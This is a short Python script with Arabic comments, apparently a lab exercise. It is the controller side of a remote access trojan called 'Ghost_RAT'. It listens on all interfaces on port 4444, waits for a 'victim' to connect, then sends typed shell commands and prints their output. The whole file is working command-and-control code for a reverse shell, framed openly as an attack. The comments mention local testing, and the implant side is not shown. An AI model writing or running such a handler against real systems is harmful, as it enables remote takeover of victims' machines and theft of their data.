import socket

# بما إن التجربة على نفس الجهاز، هنستخدم الـ Localhost
TARGET_IP = "127.0.0.1"
PORT = 4444


def start_controller():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # هنا الكنترولر هو اللي "بيسمع" (Listen)
    server.bind(("0.0.0.0", PORT))
    server.listen(1)
    print(f"[*] Waiting for victim to connect on port {PORT}...")

    conn, addr = server.accept()
    print(f"[+] Victim Connected from: {addr[0]}")

    while True:
        command = input("Ghost_RAT@Target:~$ ")
        if not command.strip():
            continue
        if command.lower() == "exit":
            break

        conn.send(command.encode())
        # استقبال النتيجة
        response = conn.recv(1024 * 50).decode(errors="ignore")
        print(response)


if __name__ == "__main__":
    start_controller()
